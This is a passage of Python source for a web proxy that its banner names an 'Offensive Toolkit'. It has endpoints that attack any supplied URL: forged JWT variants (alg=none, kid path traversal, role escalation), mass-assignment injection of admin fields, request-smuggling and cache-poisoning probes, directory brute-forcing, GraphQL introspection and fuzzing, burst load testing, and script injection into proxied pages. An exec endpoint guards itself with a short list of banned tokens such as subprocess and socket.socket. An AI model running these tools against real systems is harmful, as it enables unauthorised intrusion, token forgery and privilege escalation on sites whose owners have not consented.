    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)

    def _int(k, d, lo, hi):
        try: v = int(fields.get(k) or d)
        except Exception: v = d
        return max(lo, min(hi, v))
    def _float(k, d, lo, hi):
        try: v = float(fields.get(k) or d)
        except Exception: v = d
        return max(lo, min(hi, v))

    total       = _int("total", 100, 1, 500)
    concurrency = _int("concurrency", 5, 1, 20)
    rps         = _float("rps", 10.0, 0.5, 50.0)
    abort_after = _int("abort_after", 5, 1, 50)
    timeout_s   = _float("timeout_s", 8.0, 1.0, 30.0)

    min_interval = 1.0 / rps
    stop_flag = {"v": False}
    consecutive_429 = {"v": 0}
    first_429_at = {"v": 0}
    retry_after_val = {"v": None}
    sent_count = {"v": 0}
    latencies = []
    status_counts = {}
    errors = 0
    lock = asyncio.Lock()
    sem = asyncio.Semaphore(concurrency)
    last_fire = {"t": 0.0}

    async def one():
        if stop_flag["v"]: return
        async with sem:
            if stop_flag["v"]: return
            async with lock:
                now = time.time()
                wait = min_interval - (now - last_fire["t"])
                if wait > 0:
                    await asyncio.sleep(wait)
                last_fire["t"] = time.time()
                sent_count["v"] += 1
            t0 = time.time()
            try:
                r = await app.fetch(url, headers=BROWSER_HEADERS,
                                    timeout=timeout_s, allow_redirects=False,
                                    max_redirects=0, prefer_http2=False,
                                    use_doh=True, connect_retries=1)
                ms = int((time.time() - t0) * 1000)
                sc = r.status_code
                async with lock:
                    latencies.append(ms)
                    status_counts[sc] = status_counts.get(sc, 0) + 1
                    if sc == 429:
                        if first_429_at["v"] == 0:
                            first_429_at["v"] = sent_count["v"]
                        consecutive_429["v"] += 1
                        ra = r.headers.get("retry-after") or r.headers.get("Retry-After")
                        if ra and not retry_after_val["v"]:
                            retry_after_val["v"] = ra
                        if consecutive_429["v"] >= abort_after:
                            stop_flag["v"] = True
                    else:
                        consecutive_429["v"] = 0
            except Exception:
                async with lock:
                    nonlocal errors
                    errors += 1
                    latencies.append(int((time.time() - t0) * 1000))

    await asyncio.gather(*[one() for _ in range(total)])

    if latencies:
        s = sorted(latencies)
        def pct(p):
            i = int(len(s) * p / 100)
            return s[min(i, len(s)-1)]
        p50, p95, p99 = pct(50), pct(95), pct(99)
    else:
        p50 = p95 = p99 = 0

    throttled = status_counts.get(429, 0) > 0
    if throttled:
        hint = f"Throttled: first 429 at request #{first_429_at['v']}"
    elif errors and errors > total / 2:
        hint = "Most requests errored — target may be unreachable or dropping connections"
    else:
        hint = "No 429s observed; target absorbed the burst within this window"

    return json_response({
        "sent": sent_count["v"],
        "completed": len(latencies),
        "errors": errors,
        "status_counts": status_counts,
        "p50": p50, "p95": p95, "p99": p99,
        "throttled": throttled,
        "first_429_at": first_429_at["v"],
        "retry_after": retry_after_val["v"],
        "hint": hint,
        "limits": {"total": total, "concurrency": concurrency,
                   "rps": rps, "abort_after": abort_after},
    })


@app.post("/tool/clickjack")
async def tool_clickjack(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    r = await probe(url, timeout=10.0, follow_headers=True)
    h = r.get("headers", {}) if r.get("ok") else {}
    xfo = h.get("x-frame-options","")
    csp = h.get("content-security-policy","")
    fa = "frame-ancestors" in csp.lower()
    framable = not (xfo or fa)
    return json_response({"framable": framable, "headers": {"X-Frame-Options": xfo,
                        "CSP": csp}})


@app.post("/tool/jwt")
async def tool_jwt(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    token = (fields.get("token") or "").strip()
    if not token:
        return json_response({"error": "missing token"}, status=400)
    parts = token.split(".")
    if len(parts) < 2:
        return json_response({"error": "not a JWT"})
    def b64(s):
        pad = "=" * ((4 - len(s) % 4) % 4)
        try: return json.loads(base64.urlsafe_b64decode(s + pad))
        except Exception: return None
    header = b64(parts[0]); payload = b64(parts[1]) if len(parts) > 1 else None
    findings = []
    alg = (header or {}).get("alg","")
    if alg.lower() == "none":
        findings.append({"severity":"critical","name":"JWT alg=none",
                         "desc":"Token claims no signature — trivially forgeable."})
    if alg.startswith("HS") and header and "kid" in header:
        findings.append({"severity":"high","name":"HS* with kid",
                         "desc":"Check for kid path traversal / SQLi."})
    if payload:
        exp = payload.get("exp")
        if exp and exp < time.time():
            findings.append({"severity":"info","name":"Expired token",
                             "desc":"exp in past."})
        if not exp:
            findings.append({"severity":"medium","name":"No exp claim",
                             "desc":"Token never expires."})
        if not payload.get("iss"):
            findings.append({"severity":"low","name":"No iss claim","desc":""})
        if not payload.get("aud"):
            findings.append({"severity":"low","name":"No aud claim","desc":""})
    return json_response({"header": header, "payload": payload, "findings": findings})


@app.post("/tool/jwt-attack")
async def tool_jwt_attack(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    token = (fields.get("token") or "").strip()
    if not token:
        return json_response({"error": "missing token"}, status=400)
    parts = token.split(".")
    if len(parts) != 3:
        return json_response({"error": "need a 3-segment JWT"})
    def b64dec(s):
        pad = "=" * ((4 - len(s) % 4) % 4)
        try: return json.loads(base64.urlsafe_b64decode(s + pad))
        except Exception: return None
    def b64enc(obj):
        raw = json.dumps(obj, separators=(",",":")).encode()
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
    header = b64dec(parts[0]) or {}
    payload = b64dec(parts[1]) or {}
    variants = []
    h1 = dict(header); h1["alg"] = "none"
    variants.append({"name": "alg=none",
        "description": "Signature stripped; server should reject but often doesn't.",
        "token": f"{b64enc(h1)}.{b64enc(payload)}."})
    h2 = dict(header); h2["alg"] = "None"
    variants.append({"name": "alg=None (mixed case)",
        "description": "Case variation bypass for naive 'none' checks.",
        "token": f"{b64enc(h2)}.{b64enc(payload)}."})
    if "kid" in header:
        h3 = dict(header); h3["kid"] = "../../../../dev/null"
        variants.append({"name": "kid traversal",
            "description": "If kid is used to load a key from disk, this may force empty secret.",
            "token": f"{b64enc(h3)}.{b64enc(payload)}.{parts[2]}"})
    if isinstance(payload, dict) and ("role" in payload or "admin" in payload or "user" in payload):
        p4 = dict(payload)
        for k in ("role","admin","is_admin","isAdmin"):
            if k in p4:
                p4[k] = "admin" if k != "admin" else True
        variants.append({"name": "Role escalation",
            "description": "If the server trusts unsigned claims without verification.",
            "token": f"{parts[0]}.{b64enc(p4)}.{parts[2]}"})
    return json_response({"variants": variants})


@app.post("/tool/graphql")
async def tool_graphql(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    query = {"query": "{__schema{types{name kind}queryType{fields{name}}mutationType{fields{name}}}}"}
    try:
        r = await app.fetch(url, method="POST",
            headers={**BROWSER_HEADERS, "Content-Type":"application/json","Accept":"application/json"},
            json=query, timeout=20.0, prefer_http2=True, use_doh=True)
        if r.status_code != 200:
            return json_response({"error": f"HTTP {r.status_code}"}, status=502)
        schema = (r.json().get("data") or {}).get("__schema") or {}
        types = [t.get("name") for t in schema.get("types", []) if t.get("name")]
        queries = [f.get("name") for f in ((schema.get("queryType") or {}).get("fields") or [])]
        mutations = [f.get("name") for f in ((schema.get("mutationType") or {}).get("fields") or [])]
        return json_response({"types": types, "queries": queries, "mutations": mutations})
    except Exception as e:
        return json_response({"error": str(e)}, status=502)


@app.post("/tool/graphql-fuzz")
async def tool_graphql_fuzz(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    probes = [
        {"label": "Introspection", "query": "{__schema{queryType{name}}}"},
        {"label": "Field suggestions", "query": "{__typename}"},
        {"label": "Depth 10", "query": "{a{a{a{a{a{a{a{a{a{a{__typename}}}}}}}}}}}"},
        {"label": "Aliases",
         "query": "{a:__typename b:__typename c:__typename d:__typename e:__typename}"},
        {"label": "Empty", "query": "{}"},
    ]
    out = []
    for p in probes:
        try:
            r = await app.fetch(url, method="POST",
                headers={**BROWSER_HEADERS, "Content-Type":"application/json"},
                json={"query": p["query"]}, timeout=10.0,
                prefer_http2=True, use_doh=True)
            out.append({"label": p["label"], "status": r.status_code,
                        "length": len(r.content), "preview": r.text[:300]})
        except Exception as e:
            out.append({"label": p["label"], "error": str(e)})
    return json_response({"probes": out})


@app.post("/tool/brute")
async def tool_brute(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    paths_raw = fields.get("paths") or "[]"
    if not url:
        return json_response({"results": []}, status=400)
    try: paths = json.loads(paths_raw)
    except Exception: paths = []
    if not isinstance(paths, list): paths = []
    paths = [p for p in paths if isinstance(p, str)][:200]
    base = url.rstrip("/")
    base_resp = await probe(url, timeout=8.0)
    sem = asyncio.Semaphore(12)
    async def do(p):
        async with sem:
            target = f"{base}/{p.lstrip('/')}"
            r = await probe(target, timeout=8.0)
            if not r.get("ok"):
                return {"path": p, "status": 0, "size": 0}
            if r["status"] == base_resp.get("status") and r["hash"] == base_resp.get("hash"):
                return {"path": p, "status": 404, "size": r["length"]}
            return {"path": p, "status": r["status"], "size": r["length"]}
    results = await asyncio.gather(*[do(p) for p in paths])
    return json_response({"results": results})


@app.post("/tool/js-endpoints")
async def tool_js_endpoints(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    try:
        r = await app.fetch(url, headers=BROWSER_HEADERS, timeout=25.0,
                            allow_redirects=True, max_redirects=3,
                            prefer_http2=True, use_doh=True)
        body = r.content
        if r.headers.get("content-encoding"): body = decode_body(body, r.headers["content-encoding"])
        text = body.decode("utf-8", errors="ignore")
        found = set()
        patterns = [
            r'["\'](/[a-zA-Z0-9_\-/\.]+(?:\?[^"\']*)?)["\']',
            r'["\']((?:https?:)?//[^"\']+)["\']',
            r'fetch\(\s*["\']([^"\']+)["\']',
            r'axios\.(?:get|post|put|delete|patch)\(\s*["\']([^"\']+)["\']',
            r'url\s*:\s*["\']([^"\']+)["\']',
        ]
        for pat in patterns:
            for m in re.findall(pat, text):
                u = m.strip()
                if u and not u.startswith(("data:","javascript:","#")): found.add(u)
        out = []
        for u in sorted(found)[:400]:
            absu = urljoin(url, u) if u.startswith("/") else u
            p = urlparse(absu)
            if p.scheme in ("http","https") and p.netloc:
                out.append({"raw":u,"absolute":absu,"path":p.path,"query":p.query})
        return json_response({"endpoints": out})
    except Exception as e:
        return json_response({"error": str(e)}, status=502)


@app.post("/tool/mass-assign")
async def tool_mass_assign(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    normal = (fields.get("fields") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    try:
        base_params = dict(parse_qsl(normal))
    except Exception:
        base_params = {}
    base = await probe(url, method="POST",
                       headers={"Content-Type":"application/x-www-form-urlencoded"},
                       body=urlencode(base_params).encode(), timeout=12.0)
    if not base.get("ok"):
        return json_response({"error": f"baseline failed: {base.get('err')}"})
    extra_fields = ["role","is_admin","isAdmin","admin","verified","email_verified",
                    "account_type","plan","tier","balance","credits","permissions",
                    "activated","approved","staff","moderator"]
    out = []
    for f in extra_fields:
        params = dict(base_params); params[f] = "admin"
        r = await probe(url, method="POST",
                        headers={"Content-Type":"application/x-www-form-urlencoded"},
                        body=urlencode(params).encode(), timeout=12.0)
        if not r.get("ok"):
            out.append({"field": f, "error": r.get("err"), "differs": False}); continue
        differs, diff = diff_signature(base, r)
        out.append({"field": f, "status": r["status"], "length": r["length"],
                    "differs": differs, "diff": diff})
    return json_response({"baseline": base, "results": out})


@app.post("/tool/smuggling")
async def tool_smuggling(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    base = await probe(url, timeout=10.0)
    if not base.get("ok"):
        return json_response({"error": f"baseline failed: {base.get('err')}"})
    probes = [
        ("TE.chunked only", {"Transfer-Encoding":"chunked"}),
        ("TE + CL", {"Transfer-Encoding":"chunked","Content-Length":"6"}),
        ("TE xchunked", {"Transfer-Encoding":"xchunked"}),
        ("TE with space", {"Transfer-Encoding ":"chunked"}),
        ("TE chunked,identity", {"Transfer-Encoding":"chunked, identity"}),
    ]
    out = []
    for label, hdrs in probes:
        r = await probe(url, method="POST", headers={**BROWSER_HEADERS, **hdrs},
                        body=b"0\r\n\r\n", timeout=10.0)
        if not r.get("ok"):
            out.append({"label": label, "error": r.get("err"), "differs": False}); continue
        differs, diff = diff_signature(base, r)
        out.append({"label": label, "status": r["status"], "time": r["time"],
                    "differs": differs, "diff": diff})
    return json_response({"baseline": base, "results": out})


@app.post("/tool/cache-poison")
async def tool_cache_poison(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    token = "lynk" + uuid.uuid4().hex[:8]
    headers_to_try = ["X-Forwarded-Host","X-Host","X-Forwarded-Server",
                      "X-HTTP-Host-Override","Forwarded","X-Original-URL",
                      "X-Rewrite-URL","X-Forwarded-Scheme"]
    out = []
    for h in headers_to_try:
        r = await probe(url, headers={**BROWSER_HEADERS, h: token}, timeout=10.0)
        if not r.get("ok"):
            out.append({"header": h, "error": r.get("err"), "reflected": False}); continue
        out.append({"header": h, "status": r["status"],
                    "reflected": token in r.get("body","")})
    return json_response({"token": token, "results": out})


@app.post("/tool/cache-deception")
async def tool_cache_deception(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    base = await probe(url, timeout=10.0, follow_headers=True)
    if not base.get("ok"):
        return json_response({"error": f"baseline failed: {base.get('err')}"})
    base_cc = base["headers"].get("cache-control","")
    base_xc = base["headers"].get("x-cache","")
    tricks = ["/%2e.css","/..%2f.css","/test.css","/x.js","/x.jpg","/x.json",
              "?x.css",".css",".js"]
    out = []
    for t in tricks:
        u = url.rstrip("/") + t if t.startswith(("/","?")) else url + t
        r = await probe(u, timeout=10.0, follow_headers=True)
        if not r.get("ok"):
            out.append({"url": u, "error": r.get("err"), "differs": "error"}); continue
        cc = r["headers"].get("cache-control","")
        xc = r["headers"].get("x-cache","")
        differs = cc != base_cc or xc != base_xc
        out.append({"url": u, "status": r["status"], "cc": cc, "xc": xc,
                    "differs": "differs" if differs else "no change"})
    return json_response({"baseline": {"status": base["status"], "cc": base_cc, "xc": base_xc},
                          "results": out})


@app.post("/tool/method-override")
async def tool_method_override(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    base = await probe(url, timeout=10.0)
    if not base.get("ok"):
        return json_response({"error": f"baseline failed: {base.get('err')}"})
    probes = [
        ("X-HTTP-Method-Override: PUT", {"X-HTTP-Method-Override":"PUT"}),
        ("X-HTTP-Method-Override: DELETE", {"X-HTTP-Method-Override":"DELETE"}),
        ("X-Method-Override: PUT", {"X-Method-Override":"PUT"}),
        ("X-HTTP-Method: PUT", {"X-HTTP-Method":"PUT"}),
    ]
    out = []
    for label, hdrs in probes:
        r = await probe(url, method="POST", headers={**BROWSER_HEADERS, **hdrs},
                        body=b"", timeout=10.0)
        if not r.get("ok"):
            out.append({"label": label, "error": r.get("err"), "differs": False}); continue
        differs, diff = diff_signature(base, r)
        out.append({"label": label, "status": r["status"], "time": r["time"],
                    "differs": differs, "diff": diff})
    return json_response({"baseline": base, "results": out})


@app.post("/tool/agent-run")
async def tool_agent_run(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    code = fields.get("code") or ""
    url = (fields.get("url") or "").strip()
    if not code.strip():
        return json_response({"error": "empty code"}, status=400)
    js_markers = ("const ","let ","var ","function(","=>","document.",
                  "window.","localStorage.","querySelector","async () =>")
    if sum(1 for m in js_markers if m in code) >= 3:
        return json_response({"error": "Looks like JS — switch to 'JavaScript (page)' mode."}, status=400)
    banned = ["os.system","subprocess","os.popen","os.fork","shutil.rmtree",
              "socket.socket","eval(","exec(","__import__"]
    for b in banned:
        if b in code:
            return json_response({"error": f"banned token: {b}"}, status=403)
    safe_globals = {
        "asyncio": asyncio, "json": json, "re": re, "time": time,
        "urlparse": urlparse, "urljoin": urljoin, "quote": quote,
        "unquote": unquote, "BeautifulSoup": BeautifulSoup,
        "app": app, "BROWSER_HEADERS": BROWSER_HEADERS,
        "__builtins__": {
            "len": len, "str": str, "int": int, "float": float, "bool": bool,
            "list": list, "dict": dict, "set": set, "tuple": tuple,
            "range": range, "enumerate": enumerate, "zip": zip,
            "sorted": sorted, "min": min, "max": max, "sum": sum,
            "any": any, "all": all, "print": print, "repr": repr,
            "type": type, "getattr": getattr, "hasattr": hasattr,
            "isinstance": isinstance, "Exception": Exception,
            "ValueError": ValueError, "KeyError": KeyError, "TypeError": TypeError,
        },
    }
    local_ctx = {"url": url, "host": urlparse(url).hostname if url else "",
                 "headers": BROWSER_HEADERS}
    try:
        exec(compile(code, "<agent>", "exec"), safe_globals, local_ctx)
        result = local_ctx.get("result") or local_ctx.get("__result__")
        if asyncio.iscoroutine(result): result = await result
        if not isinstance(result, (dict, list, str, int, float, bool, type(None))):
            result = repr(result)
        return json_response({"ok": True, "result": result})
    except Exception as e:
        return json_response({"ok": False, "error": f"{type(e).__name__}: {e}"})


@app.post("/tool/vulnscan")
async def tool_vulnscan(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    active = (fields.get("active") or "1") == "1"
    if not url:
        return json_response({"error": "missing url"}, status=400)
    return json_response(await run_vuln_scan(url, active=active))


@app.get("/tool/diag")
async def tool_diag(req):
    url = req.query_params.get("url") or ""
    if not url:
        return json_response({"error": "missing url"}, status=400)
    return json_response(await app.diagnose_url(url))


@app.get("/tool/history")
async def tool_history(req):
    sid, _ = session_from_req(req)
    return json_response({"entries": list(get_session(sid).history)[-60:][::-1]})


@app.get("/tool/source")
async def tool_source(req):
    url = req.query_params.get("url") or ""
    if not url:
        return RawResponse("missing url", status=400, content_type="text/plain")
    try:
        r = await app.fetch(url, headers=BROWSER_HEADERS, timeout=20.0,
                            allow_redirects=True, max_redirects=3,
                            prefer_http2=True, use_doh=True)
        body = r.content
        if r.headers.get("content-encoding"): body = decode_body(body, r.headers["content-encoding"])
        return RawResponse(body, content_type="text/plain; charset=utf-8")
    except Exception as e:
        return RawResponse(f"Fetch failed: {e}", status=502, content_type="text/plain")


@app.post("/tool/source/save")
async def tool_source_save(req):
    sid, _ = session_from_req(req)
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    html = fields.get("html", "")
    if not url:
        return RawResponse("missing url", status=400, content_type="text/plain")
    get_session(sid).source_cache[url] = html.encode("utf-8")
    return RawResponse("ok", content_type="text/plain")


@app.post("/tool/source/clear")
async def tool_source_clear(req):
    sid, _ = session_from_req(req)
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    get_session(sid).source_cache.pop(url, None)
    return RawResponse("ok", content_type="text/plain")


@app.get("/tool/headers")
async def tool_headers(req):
    url = req.query_params.get("url") or ""
    if not url:
        return json_response({"status": 0, "headers": {}}, status=400)
    try:
        r = await app.fetch(url, headers=BROWSER_HEADERS, timeout=15.0,
                            method="HEAD", allow_redirects=True, max_redirects=3,
                            prefer_http2=True, use_doh=True)
        return json_response({"status": r.status_code, "headers": dict(r.headers)})
    except Exception as e:
        return json_response({"status": 0, "headers": {"error": str(e)}}, status=502)


@app.get("/tool/scan")
async def tool_scan(req):
    url = req.query_params.get("url") or ""
    if not url:
        return json_response({"security": {}, "tech": []}, status=400)
    try:
        r = await app.fetch(url, headers=BROWSER_HEADERS, timeout=15.0,
                            allow_redirects=True, max_redirects=3,
                            prefer_http2=True, use_doh=True)
        headers = dict(r.headers); body = r.content
        if headers.get("content-encoding"): body = decode_body(body, headers["content-encoding"])
        text = body.decode("utf-8", errors="ignore")
    except Exception as e:
        return json_response({"security": {"error": {"ok": False, "note": str(e)}}, "tech": []},
                             status=502)
    def h(k): return headers.get(k.lower(), "")
    security = {
        "Strict-Transport-Security": {"ok": bool(h("strict-transport-security")),
                                      "note": "HSTS" if h("strict-transport-security") else "missing"},
        "Content-Security-Policy": {"ok": bool(h("content-security-policy")),
                                    "note": "set" if h("content-security-policy") else "missing"},
        "X-Frame-Options": {"ok": bool(h("x-frame-options")),
                            "note": h("x-frame-options") or "missing"},
        "X-Content-Type-Options": {"ok": bool(h("x-content-type-options")),
                                   "note": h("x-content-type-options") or "missing"},
        "Referrer-Policy": {"ok": bool(h("referrer-policy")),
                            "note": h("referrer-policy") or "missing"},
        "Permissions-Policy": {"ok": bool(h("permissions-policy")),
                               "note": h("permissions-policy") or "missing"},
        "COOP": {"ok": bool(h("cross-origin-opener-policy")),
                 "note": "set" if h("cross-origin-opener-policy") else "missing"},
    }
    tech = []
    if h("server"): tech.append(f"Server: {h('server')}")
    if h("x-powered-by"): tech.append(f"Powered by: {h('x-powered-by')}")
    if h("via"): tech.append(f"Via: {h('via')}")
    low = text.lower()[:8000]
    for k, v in (("wp-content","WordPress"),("__NEXT_DATA__","Next.js"),
                 ("data-reactroot","React"),("ng-version","Angular"),("data-v-","Vue")):
        if k in text or k in low: tech.append(v)
    if "cloudflare" in (h("server") or "").lower() or h("cf-ray"): tech.append("Cloudflare")
    ck = h("set-cookie").lower()
    if "jsessionid" in ck: tech.append("Java (JSESSIONID)")
    if "phpsessid" in ck: tech.append("PHP (PHPSESSID)")
    if "asp.net" in ck: tech.append("ASP.NET")
    return json_response({"security": security, "tech": tech})


@app.get("/tool/robots")
async def tool_robots(req):
    url = req.query_params.get("url") or ""
    if not url:
        return RawResponse("# missing url", content_type="text/plain", status=400)
    p = urlparse(url)
    try:
        r = await app.fetch(f"{p.scheme}://{p.netloc}/robots.txt",
                            headers=BROWSER_HEADERS, timeout=10.0,
                            allow_redirects=True, max_redirects=2,
                            prefer_http2=True, use_doh=True)
        body = r.content
        if r.headers.get("content-encoding"): body = decode_body(body, r.headers["content-encoding"])
        return RawResponse(body, content_type="text/plain; charset=utf-8")
    except Exception as e:
        return RawResponse(f"# Fetch failed: {e}", content_type="text/plain", status=502)


@app.get("/tool/sitemap")
async def tool_sitemap(req):
    url = req.query_params.get("url") or ""
    if not url:
        return RawResponse("<!-- missing url -->", content_type="text/plain", status=400)
    p = urlparse(url)
    try:
        r = await app.fetch(f"{p.scheme}://{p.netloc}/sitemap.xml",
                            headers=BROWSER_HEADERS, timeout=10.0,
                            allow_redirects=True, max_redirects=2,
                            prefer_http2=True, use_doh=True)
        body = r.content
        if r.headers.get("content-encoding"): body = decode_body(body, r.headers["content-encoding"])
        return RawResponse(body, content_type="text/plain; charset=utf-8")
    except Exception as e:
        return RawResponse(f"<!-- Fetch failed: {e} -->", content_type="text/plain", status=502)


@app.get("/tool/dns")
async def tool_dns(req):
    url = req.query_params.get("url") or ""
    if not url:
        return json_response({"host": "", "addresses": []}, status=400)
    host = urlparse(url).hostname or url
    addrs = []
    try:
        loop = asyncio.get_running_loop()
        infos = await loop.getaddrinfo(host, None)
        for info in infos:
            fam, _, _, _, sockaddr = info
            ip = sockaddr[0]
            tag = "IPv6" if fam == socket.AF_INET6 else "IPv4"
            entry = f"{ip} ({tag})"
            if entry not in addrs: addrs.append(entry)
    except Exception: pass
    return json_response({"host": host, "addresses": addrs})


@app.get("/tool/inject/list")
async def inject_list(req):
    sid, _ = session_from_req(req)
    sess = get_session(sid)
    return json_response({"snippets": [
        {"id": s["id"], "name": s["name"], "enabled": s["enabled"], "size": len(s["code"])}
        for s in sess.injected]})


@app.post("/tool/inject/add")
async def inject_add(req):
    sid, _ = session_from_req(req)
    sess = get_session(sid)
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    name = (fields.get("name") or "unnamed").strip()
    code = fields.get("code") or ""
    if not code.strip():
        return json_response({"ok": False, "reason": "empty"}, status=400)
    sess.injected.append({"id": uuid.uuid4().hex[:8], "name": name,
                          "code": code, "enabled": True})
    return json_response({"ok": True})


@app.post("/tool/inject/tog")
async def inject_toggle(req):
    sid, _ = session_from_req(req)
    sess = get_session(sid)
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    iid = fields.get("id") or ""
    for s in sess.injected:
        if s["id"] == iid:
            s["enabled"] = not s["enabled"]
            return json_response({"ok": True, "enabled": s["enabled"]})
    return json_response({"ok": False}, status=404)


@app.post("/tool/inject/del")
async def inject_delete(req):
    sid, _ = session_from_req(req)
    sess = get_session(sid)
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    iid = fields.get("id") or ""
    before = len(sess.injected)
    sess.injected = [s for s in sess.injected if s["id"] != iid]
    return json_response({"ok": len(sess.injected) < before})


@app.get("/search")
async def search(req):
    q = (req.query_params.get("q") or "").strip()
    engine = (req.query_params.get("engine") or "google").lower()
    if not q:
        return error_page("Empty query", "Type a search query.", 400)
    if engine not in SEARCH_ENGINES: engine = "google"
    _, tpl = SEARCH_ENGINES[engine]
    sid, _ = session_from_req(req)
    return await serve_proxied(req, tpl.replace("{q}", quote(q)), sid)


@app.route("/proxy", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"])
async def proxy_route(req):
    raw_q = req.path.split("?", 1)[1] if "?" in req.path else ""
    qs = parse_qs(raw_q, keep_blank_values=True)
    urls = qs.pop("url", [])
    if not urls or not urls[0].strip():
        ct = req.headers.get("content-type", "").lower()
        if req.body and "x-www-form-urlencoded" in ct:
            try: urls = parse_qs(req.body.decode("utf-8", errors="ignore")).get("url", [])
            except Exception: pass
    if not urls or not urls[0].strip():
        return error_page("Missing URL", "No url parameter provided.", 400)
    target = urls[0].strip()
    if qs: target += ("&" if "?" in target else "?") + urlencode(qs, doseq=True)
    if not target.startswith(("http://","https://")):
        if looks_like_url(target): target = "https://" + target
        else:
            sid, _ = session_from_req(req)
            s_url = SEARCH_ENGINES["google"][1].replace("{q}", quote(target))
            return await serve_proxied(req, s_url, sid)
    p = urlparse(target)
    if p.scheme not in ("http","https") or not p.netloc:
        return error_page("Invalid URL", f"Could not parse: {target}", 400)
    if is_self_target(req, target):
        sid, _ = session_from_req(req)
        sess = get_session(sid)
        if sess.last_origin:
            ro = urlparse(sess.last_origin)
            if _norm_host(ro.netloc) != _norm_host(p.netloc):
                recovered = f"{ro.scheme}://{ro.netloc}{p.path}"
                if p.query: recovered += "?" + p.query
                return await serve_proxied(req, recovered, sid)
        return error_page("Refusing to proxy to itself",
                          f"<code>{esc(target)}</code> is this proxy.", 508)
    sid, _ = session_from_req(req)
    return await serve_proxied(req, target, sid)


@app.get("/__lynk_ws")
async def ws_tunnel_get(req):
    return error_page("WebSocket endpoint",
                      "This endpoint accepts only WebSocket upgrades.", 426)


@app.route("/*", methods=["GET","POST","PUT","PATCH","DELETE","OPTIONS","HEAD"])
async def catch_all(req, wildcard=""):
    parts = req.path.split("?", 1)
    path_only = parts[0] or "/"
    qs = parts[1] if len(parts) > 1 else ""
    sid, _ = session_from_req(req)
    sess = get_session(sid)
    origin = resolve_origin(req, sess)
    if not origin:
        return error_page("Lost context",
                          f"Received <code>{esc(path_only)}</code> but couldn't "
                          "determine upstream. Start from the home page.", 404)
    target = origin.rstrip("/") + path_only
    if qs: target += "?" + qs
    return await serve_proxied(req, target, sid)


@app.get("/healthz")
async def healthz(req):
    return json_response({"status": "ok", "framework": framework_version,
                          "sessions": len(SESSIONS)})


if __name__ == "__main__":
    print("=" * 68)
    print("  🛠  Lynkio Browser & Offensive Toolkit  —  v14")
    print("=" * 68)
    print(f"  Home         →  http://localhost:{PORT}/")
    print(f"  Multi-tab    →  http://localhost:{PORT}/tabs")
    print(f"  Proxy        →  http://localhost:{PORT}/proxy?url=…")
    print(f"  Panel        →  http://localhost:{PORT}/tool/panel.js")
    print(f"  Kit          →  http://localhost:{PORT}/tool/kit.js")
    print("=" * 68)
    print(f"  Framework    →  lynkio v{framework_version}")
    print(f"  Payloads     →  {sum(len(v) for v in PAYLOADS.values())} across {len(PAYLOADS)} categories")
    print("  Features     →  responsive shell · tabs drawer · bounded rate-limit stress")
    print("  New in v14   →  safe-area fixes · tabs manager · bounded load probe")
    print("=" * 68)
    app.run()